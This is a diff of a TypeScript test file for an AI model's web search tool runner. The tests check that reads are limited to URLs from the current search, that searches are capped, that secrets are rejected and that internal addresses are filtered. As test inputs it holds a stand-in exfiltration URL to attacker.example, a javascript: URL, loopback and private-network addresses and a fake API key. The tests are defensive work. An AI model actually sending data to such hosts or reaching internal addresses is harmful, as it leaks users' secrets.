@@ -1,669 +1,206 @@
 import { describe, expect, it, vi } from 'vitest';
-import { WEB_SEARCH_TOOL_NAMES } from './toolDefinitions';
+import { createWebSearchExecutionSession } from './executionSession';
 import { runWebSearchToolCall } from './toolRunner';
 import type { WebSearchClient } from './client';
-import { MAX_OPENAI_TOOL_ARGUMENT_CHARS } from './openAIToolParsing';
+import type { WebSearchStatus } from './types';
 
-describe('web search tool runner', () => {
-  it('runs search and emits search/result statuses', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => ({
-        query: 'openai news',
-        results: [{
-          title: 'News',
-          url: 'https://example.com/news',
-          snippet: 'Snippet',
-          publishedAt: '2026-05-06',
-          source: 'example',
-          thumbnail: null,
-        }],
-      })),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
+const RESULT_URL = 'https://example.com/page';
 
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'openai news', category: 'news', timeRange: 'week' }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(client.webSearch).toHaveBeenCalledWith('openai news', {
-      category: 'news',
-      timeRange: 'week',
-      limit: 5,
-    });
-    expect(statuses).toEqual([
-      { phase: 'searching', query: 'openai news' },
-      {
-        phase: 'results',
-        query: 'openai news',
-        results: [{
-          title: 'News',
-          url: 'https://example.com/news',
-          snippet: 'Snippet',
-          publishedAt: '2026-05-06',
-        }],
-        metrics: {
-          durationMs: expect.any(Number),
-          resultCount: 1,
-        },
-      },
-    ]);
-    expect(text).toContain('Candidate sources');
-    expect(text).toContain('https://example.com/news');
-  });
-
-  it('accepts model-emitted aliases for search and read tools', async () => {
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => ({
-        query: 'pytorch',
-        results: [],
-      })),
-      readWebPage: vi.fn(async () => ({
-        title: 'Page',
+function createClient(): WebSearchClient {
+  return {
+    webSearch: vi.fn(async (query) => ({
+      query,
+      results: [{
+        title: 'Example',
+        url: RESULT_URL,
+        snippet: 'Example result',
+        publishedAt: null,
+        source: 'test',
+        thumbnail: null,
+      }],
+    })),
+    readWebPage: vi.fn(async (url) => ({
+      title: 'Example',
+      summary: '',
+      siteName: 'example.com',
+      finalUrl: url,
+      content: 'Readable page content.',
+      charCount: 22,
+    })),
+    readWebPages: vi.fn(async (urls: string[]) => urls.map((url: string) => ({
+      url,
+      ok: true,
+      page: {
+        title: 'Example',
         summary: '',
         siteName: 'example.com',
-        finalUrl: 'https://example.com/page',
-        content: 'Readable content from the page.',
-        charCount: 31,
-      })),
-      readWebPages: vi.fn(),
-    };
+        finalUrl: url,
+        content: 'Readable page content.',
+        charCount: 22,
+      },
+    }))),
+  };
+}
 
-    await runWebSearchToolCall(
-      { name: 'search_web', arguments: JSON.stringify({ query: 'pytorch' }) },
-      { client },
-    );
-    const pageText = await runWebSearchToolCall(
-      { name: 'fetchUrl', arguments: JSON.stringify({ url: 'https://example.com/page' }) },
-      { client },
-    );
+describe('web search tool runner', () => {
+  it('registers search results and emits bounded statuses', async () => {
+    const client = createClient();
+    const session = createWebSearchExecutionSession();
+    const statuses: WebSearchStatus[] = [];
 
-    expect(client.webSearch).toHaveBeenCalledWith('pytorch', {
-      category: undefined,
-      timeRange: undefined,
-      limit: 5,
+    const content = await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'example' }),
+    }, {
+      client,
+      session,
+      onStatus: (status) => statuses.push(status),
     });
-    expect(client.readWebPage).toHaveBeenCalledWith('https://example.com/page', {
+
+    expect(content).toContain(RESULT_URL);
+    expect(statuses.map((status) => status.phase)).toEqual(['searching', 'results']);
+  });
+
+  it('reads an exact URL returned by the current search', async () => {
+    const client = createClient();
+    const session = createWebSearchExecutionSession();
+    await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'example' }),
+    }, { client, session });
+
+    const content = await runWebSearchToolCall({
+      name: 'read_web_page',
+      arguments: JSON.stringify({ url: RESULT_URL }),
+    }, { client, session });
+
+    expect(client.readWebPage).toHaveBeenCalledWith(RESULT_URL, {
       contentLimit: 3000,
       retries: 0,
     });
-    expect(pageText).toContain('Readable content from the page.');
+    expect(content).toContain('Readable page content.');
   });
 
-  it('auto-reads the first unique search URLs without scanning unneeded results', async () => {
-    const unneededResult = {
-      title: 'Unneeded',
-      snippet: 'Snippet',
-      publishedAt: null,
-      source: null,
-      thumbnail: null,
-    } as { title: string; url: string; snippet: string; publishedAt: null; source: null; thumbnail: null };
-    Object.defineProperty(unneededResult, 'url', {
-      get() {
-        throw new Error('unneeded result URL was read');
-      },
-    });
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => ({
-        query: 'sample app',
-        results: [
-          {
-            title: 'One',
-            url: 'https://example.com/one',
-            snippet: 'Snippet',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'One duplicate',
-            url: 'https://example.com/one',
-            snippet: 'Snippet',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'Two',
-            url: 'https://example.com/two',
-            snippet: 'Snippet',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'Three',
-            url: 'https://example.com/three',
-            snippet: 'Snippet',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'Four',
-            url: 'https://example.com/four',
-            snippet: 'Snippet',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          unneededResult,
-        ],
-      })),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(async (urls: string[]) => urls.map((url) => ({
-        url,
-        ok: true,
-        page: {
-          title: url,
-          summary: '',
-          siteName: new URL(url).hostname,
-          finalUrl: url,
-          content: 'Readable page content.',
-          charCount: 22,
-        },
-      }))),
-    };
+  it('rejects arbitrary public URLs that were not search results', async () => {
+    const client = createClient();
 
-    await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'sample app' }),
-      },
-      { client, autoReadAfterSearch: true },
-    );
+    const content = await runWebSearchToolCall({
+      name: 'read_web_page',
+      arguments: JSON.stringify({ url: 'https://attacker.example/collect?secret=value' }),
+    }, { client, session: createWebSearchExecutionSession() });
 
-    expect(client.readWebPages).toHaveBeenCalledWith([
-      'https://example.com/one',
-      'https://example.com/two',
-      'https://example.com/three',
-    ], {
-      contentLimit: 3000,
-      retries: 0,
-    });
-  });
-
-  it('filters unsafe search result URLs before emitting or auto-reading sources', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => ({
-        query: 'sample app',
-        results: [
-          {
-            title: 'Loopback',
-            url: 'http://127.0.0.1:3000/admin',
-            snippet: 'Bad',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'Safe',
-            url: ' https://example.com/safe-article ',
-            snippet: 'Good',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-          {
-            title: 'Relative',
-            url: '/internal',
-            snippet: 'Bad',
-            publishedAt: null,
-            source: null,
-            thumbnail: null,
-          },
-        ],
-      })),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(async (urls: string[]) => urls.map((url) => ({
-        url,
-        ok: true,
-        page: {
-          title: 'Safe',
-          summary: '',
-          siteName: 'safe.example',
-          finalUrl: url,
-          content: 'Readable page content.',
-          charCount: 22,
-        },
-      }))),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'sample app' }),
-      },
-      { client, autoReadAfterSearch: true, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(client.readWebPages).toHaveBeenCalledWith(['https://example.com/safe-article'], {
-      contentLimit: 3000,
-      retries: 0,
-    });
-    expect(statuses).toEqual([
-      { phase: 'searching', query: 'sample app' },
-      {
-        phase: 'results',
-        query: 'sample app',
-        results: [{
-          title: 'Safe',
-          url: 'https://example.com/safe-article',
-          snippet: 'Good',
-          publishedAt: null,
-        }],
-        metrics: {
-          durationMs: expect.any(Number),
-          resultCount: 1,
-        },
-      },
-      { phase: 'reading', urls: ['https://example.com/safe-article'] },
-      {
-        phase: 'complete',
-        urls: ['https://example.com/safe-article'],
-        failedSources: [],
-        metrics: {
-          durationMs: expect.any(Number),
-          failureCount: 0,
-          successCount: 1,
-        },
-      },
-    ]);
-    expect(text).toContain('https://example.com/safe-article');
-    expect(text).not.toContain('127.0.0.1');
-    expect(text).not.toContain('/internal');
-  });
-
-  it('accepts model-emitted aliases for batch page reads', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(async () => [{
-        url: 'https://example.com/a',
-        ok: true,
-        page: {
-          title: 'A',
-          summary: '',
-          siteName: 'example.com',
-          finalUrl: 'https://example.com/a',
-          content: 'Readable A',
-          charCount: 10,
-        },
-      }]),
-    };
-
-    const text = await runWebSearchToolCall(
-      { name: 'fetch_web_pages', arguments: JSON.stringify({ urls: ['https://example.com/a'] }) },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(client.readWebPages).toHaveBeenCalledWith(['https://example.com/a'], {
-      contentLimit: 3000,
-      retries: 0,
-    });
-    expect(statuses).toEqual([
-      { phase: 'reading', urls: ['https://example.com/a'] },
-      {
-        phase: 'complete',
-        urls: ['https://example.com/a'],
-        failedSources: [],
-        metrics: {
-          durationMs: expect.any(Number),
-          failureCount: 0,
-          successCount: 1,
-        },
-      },
-    ]);
-    expect(text).toContain('Readable A');
-  });
-
-  it('sanitizes tool errors before returning them to the model', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => {
-        throw new Error('INTERNAL_SEARCH_BACKEND_URL is missing');
-      }),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    const text = await runWebSearchToolCall(
-      { name: WEB_SEARCH_TOOL_NAMES.search, arguments: JSON.stringify({ query: 'news' }) },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(text).toBe('Tool error: Web search is temporarily unavailable.');
-    expect(statuses).toEqual([
-      { phase: 'searching', query: 'news' },
-      { phase: 'error', message: 'Web search is temporarily unavailable.' },
-    ]);
-    expect(text).not.toContain('INTERNAL_SEARCH_BACKEND_URL');
-  });
-
-  it('reports safe read failure reasons without leaking raw errors', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(async () => {
-        throw Object.assign(new Error('internal policy stack'), { code: 'blocked_source' });
-      }),
-      readWebPages: vi.fn(),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.read,
-        arguments: JSON.stringify({ url: 'https://news.qq.com/rain/a/20260509A029BH00?adChannelId=news' }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(text).toBe('Tool error: This source is blocked by the web search source policy. The source was skipped.');
-    expect(statuses).toEqual([
-      { phase: 'reading', urls: ['https://news.qq.com/rain/a/20260509A029BH00?adChannelId=news'] },
-      { phase: 'error', message: 'This source is blocked by the web search source policy. The source was skipped.' },
-    ]);
-    expect(text).not.toContain('internal policy stack');
-  });
-
-  it('emits read metrics and safe skipped source details for batch reads', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(async () => [
-        {
-          url: 'https://ok.example',
-          ok: true,
-          page: {
-            title: 'OK',
-            summary: '',
-            siteName: 'ok.example',
-            finalUrl: 'https://ok.example',
-            content: 'Readable content',
-            charCount: 16,
-          },
-        },
-        {
-          url: 'https://fail.example',
-          ok: false,
-          error: 'HTTP 500 from provider',
-          code: 'http_error',
-        },
-      ]),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.readBatch,
-        arguments: JSON.stringify({ urls: ['https://ok.example', 'https://fail.example'] }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(statuses).toEqual([
-      { phase: 'reading', urls: ['https://ok.example', 'https://fail.example'] },
-      {
-        phase: 'complete',
-        urls: ['https://ok.example'],
-        failedSources: [{
-          url: 'https://fail.example',
-          message: 'The page returned an HTTP error.',
-        }],
-        metrics: {
-          durationMs: expect.any(Number),
-          failureCount: 1,
-          successCount: 1,
-        },
-      },
-    ]);
-    expect(text).toContain('The page returned an HTTP error.');
-    expect(text).not.toContain('HTTP 500 from provider');
-  });
-
-  it('rejects unsafe direct read URLs before calling the web search client', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.read,
-        arguments: JSON.stringify({ url: 'http://localhost/admin' }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(text).toBe('Tool error: Tool call arguments were invalid.');
-    expect(statuses).toEqual([
-      { phase: 'error', message: 'Tool call arguments were invalid.' },
-    ]);
     expect(client.readWebPage).not.toHaveBeenCalled();
+    expect(content).toContain('Only URLs returned by the current web search');
   });
 
-  it('drops unsafe batch read URLs and reads remaining public sources', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(async (urls: string[]) => urls.map((url) => ({
-        url,
-        ok: true,
-        page: {
-          title: 'OK',
-          summary: '',
-          siteName: 'safe.example',
-          finalUrl: url,
-          content: 'Readable content',
-          charCount: 16,
-        },
-      }))),
-    };
+  it('rejects new search calls after a page read begins', async () => {
+    const client = createClient();
+    const session = createWebSearchExecutionSession();
+    await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'example' }),
+    }, { client, session });
+    await runWebSearchToolCall({
+      name: 'read_web_page',
+      arguments: JSON.stringify({ url: RESULT_URL }),
+    }, { client, session });
 
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.readBatch,
-        arguments: JSON.stringify({
-          urls: [
-            'http://192.168.1.1/router',
-            'https://safe.example/a',
-            'javascript:alert(1)',
-          ],
-        }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(client.readWebPages).toHaveBeenCalledWith(['https://safe.example/a'], {
-      contentLimit: 3000,
-      retries: 0,
-    });
-    expect(statuses[0]).toEqual({ phase: 'reading', urls: ['https://safe.example/a'] });
-    expect(text).toContain('https://safe.example/a');
-    expect(text).not.toContain('192.168.1.1');
-    expect(text).not.toContain('javascript:');
-  });
-
-  it('passes cancellation signals through to the web search client', async () => {
-    const controller = new AbortController();
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async (_query, _options, signal) => {
-        expect(signal).toBe(controller.signal);
-        return { query: 'openai', results: [] };
-      }),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'openai' }),
-      },
-      { client, signal: controller.signal },
-    );
+    const content = await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'private conversation content' }),
+    }, { client, session });
 
     expect(client.webSearch).toHaveBeenCalledTimes(1);
+    expect(content).toContain('New searches are not allowed after page reading has started.');
   });
 
-  it('does not swallow abort errors as normal tool failures', async () => {
-    const controller = new AbortController();
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => {
-        controller.abort();
-        throw new DOMException('cancelled', 'AbortError');
-      }),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
+  it('rejects a mixed batch containing an unregistered URL', async () => {
+    const client = createClient();
+    const session = createWebSearchExecutionSession();
+    await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'example' }),
+    }, { client, session });
 
-    await expect(runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'openai' }),
-      },
-      { client, signal: controller.signal },
-    )).rejects.toMatchObject({ name: 'AbortError' });
-  });
+    const content = await runWebSearchToolCall({
+      name: 'read_web_pages',
+      arguments: JSON.stringify({ urls: [RESULT_URL, 'https://attacker.example/'] }),
+    }, { client, session });
 
-  it('stops before calling the search client when a status callback cancels the request', async () => {
-    const controller = new AbortController();
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    await expect(runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'openai' }),
-      },
-      {
-        client,
-        signal: controller.signal,
-        onStatus: () => controller.abort(),
-      },
-    )).rejects.toMatchObject({ name: 'AbortError' });
-
-    expect(client.webSearch).not.toHaveBeenCalled();
-  });
-
-  it('treats downstream abort-shaped failures as tool failures when the chat is still active', async () => {
-    const controller = new AbortController();
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(async () => {
-        throw new DOMException('provider internal timeout', 'AbortError');
-      }),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'openai' }),
-      },
-      { client, signal: controller.signal, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(controller.signal.aborted).toBe(false);
-    expect(text).toBe('Tool error: Web search is temporarily unavailable.');
-    expect(statuses).toEqual([
-      { phase: 'searching', query: 'openai' },
-      { phase: 'error', message: 'Web search is temporarily unavailable.' },
-    ]);
-  });
-
-  it('rejects oversized tool arguments before calling the web search client', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
-
-    const text = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: 'x'.repeat(MAX_OPENAI_TOOL_ARGUMENT_CHARS + 1),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-
-    expect(text).toBe('Tool error: Tool call arguments were invalid.');
-    expect(statuses).toEqual([
-      { phase: 'error', message: 'Tool call arguments were invalid.' },
-    ]);
-    expect(client.webSearch).not.toHaveBeenCalled();
-    expect(client.readWebPage).not.toHaveBeenCalled();
     expect(client.readWebPages).not.toHaveBeenCalled();
+    expect(content).toContain('Only URLs returned by the current web search');
   });
 
-  it('rejects oversized query and URL values before calling the web search client', async () => {
-    const statuses: unknown[] = [];
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
+  it('enforces the per-request search budget', async () => {
+    const client = createClient();
+    const session = createWebSearchExecutionSession();
+    for (const query of ['one', 'two', 'three']) {
+      await runWebSearchToolCall({
+        name: 'web_search',
+        arguments: JSON.stringify({ query }),
+      }, { client, session });
+    }
 
-    const searchText = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.search,
-        arguments: JSON.stringify({ query: 'x'.repeat(1001) }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
-    const readText = await runWebSearchToolCall(
-      {
-        name: WEB_SEARCH_TOOL_NAMES.read,
-        arguments: JSON.stringify({ url: 'https://example.com/'.padEnd(16 * 1024 + 1, 'x') }),
-      },
-      { client, onStatus: (status) => statuses.push(status) },
-    );
+    const content = await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'four' }),
+    }, { client, session });
 
-    expect(searchText).toBe('Tool error: Tool call arguments were invalid.');
-    expect(readText).toBe('Tool error: Tool call arguments were invalid.');
-    expect(statuses).toEqual([
-      { phase: 'error', message: 'Tool call arguments were invalid.' },
-      { phase: 'error', message: 'Tool call arguments were invalid.' },
-    ]);
-    expect(client.webSearch).not.toHaveBeenCalled();
-    expect(client.readWebPage).not.toHaveBeenCalled();
-    expect(client.readWebPages).not.toHaveBeenCalled();
+    expect(client.webSearch).toHaveBeenCalledTimes(3);
+    expect(content).toContain('search request budget was exhausted');
   });
 
-  it('bounds unsupported tool names before returning them to the model', async () => {
-    const client: WebSearchClient = {
-      webSearch: vi.fn(),
-      readWebPage: vi.fn(),
-      readWebPages: vi.fn(),
-    };
+  it('rejects high-confidence secrets in model-generated search queries', async () => {
+    const client = createClient();
+    const content = await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'api_key=sk-example-secret-value-123456789' }),
+    }, { client, session: createWebSearchExecutionSession() });
 
-    const text = await runWebSearchToolCall(
-      {
-        name: `${'unsupported-'.repeat(20)}tool`,
-        arguments: JSON.stringify({ query: 'openai' }),
-      },
-      { client },
-    );
-
-    expect(text.startsWith('Unsupported web search tool: unsupported_unsupported')).toBe(true);
-    expect(text.length).toBeLessThan(180);
     expect(client.webSearch).not.toHaveBeenCalled();
+    expect(content).toContain('Sensitive values cannot be sent to web search.');
+  });
+
+  it('filters unsafe result URLs before registering them', async () => {
+    const client = createClient();
+    vi.mocked(client.webSearch).mockResolvedValueOnce({
+      query: 'unsafe',
+      results: [{
+        title: 'Local',
+        url: 'http://127.0.0.1/private',
+        snippet: '',
+        publishedAt: null,
+        source: null,
+        thumbnail: null,
+      }],
+    });
+    const session = createWebSearchExecutionSession();
+
+    await runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'unsafe' }),
+    }, { client, session });
+    const content = await runWebSearchToolCall({
+      name: 'read_web_page',
+      arguments: JSON.stringify({ url: 'http://127.0.0.1/private' }),
+    }, { client, session });
+
     expect(client.readWebPage).not.toHaveBeenCalled();
-    expect(client.readWebPages).not.toHaveBeenCalled();
+    expect(content).toContain('Tool call arguments were invalid.');
+  });
+
+  it('propagates active request cancellation', async () => {
+    const client = createClient();
+    const controller = new AbortController();
+    controller.abort();
+
+    await expect(runWebSearchToolCall({
+      name: 'web_search',
+      arguments: JSON.stringify({ query: 'cancelled' }),
+    }, {
+      client,
+      session: createWebSearchExecutionSession(),
+      signal: controller.signal,
+    })).rejects.toMatchObject({ name: 'AbortError' });
   });
 });
